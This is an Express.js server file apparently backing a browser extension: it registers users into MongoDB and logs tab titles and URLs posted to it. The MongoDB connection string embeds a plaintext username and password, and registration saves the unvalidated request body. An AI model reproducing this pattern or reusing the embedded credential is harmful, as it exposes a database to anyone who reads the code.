const express = require('express');
const mongoose = require('mongoose');
const User = require('./modles/users');
const app = express();
const customCors = require('./cors');
const bodyParser = require('body-parser');
app.use(bodyParser.json());
app.use(express.json()); // for parsing application/json
app.use(customCors); // Use the custom CORS middleware directly

// Replace with your MongoDB URI
const mongoURI = 'mongodb+srv://dbUser:1ky8HUgvPijXiClT@emailhack.w6fwyqe.mongodb.net/?retryWrites=true&w=majority';

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    console.log('MongoDB Connected…');
  })
  .catch(err => {
    console.error('Error connecting to MongoDB:', err.message); // More descriptive error message
  });

app.post('/register', async (req, res) => {
  try {
    const user = new User(req.body);
    await user.save();
    res.send('User created');
  } catch (error) {
    console.error('Error during user registration:', error.message); // Log the error message
    res.status(500).send('Internal server error');
  }
});


app.post('/', async (req, res) => {
  try {
    // Here, we're assuming the tab info is being sent in the body of the request
    const tabInfo = req.body; // You might need to adjust this depending on how the data is sent
    const { title, url } = tabInfo;

    if (!title || !url) {
      return res.status(400).send('Title or URL missing in the request');
    }

    // Log the title and URL
    console.log(`Title: ${title}`);
    console.log(`URL: ${url}`);

    // Sending back a success response
    res.json({ message: 'Tab information received successfully!' });
  } catch (error) {
    console.error('Error while receiving tab information:', error.message);
    res.status(500).send(error.message);
  }
});



// Handle undefined routes
app.use('*', (req, res) => {
  res.status(404).send('404 Not Found');
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Global error handler:', err.message);
  res.status(500).send('Internal Server Error');
});

const port = 3000; // or whatever port you want
app.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
});
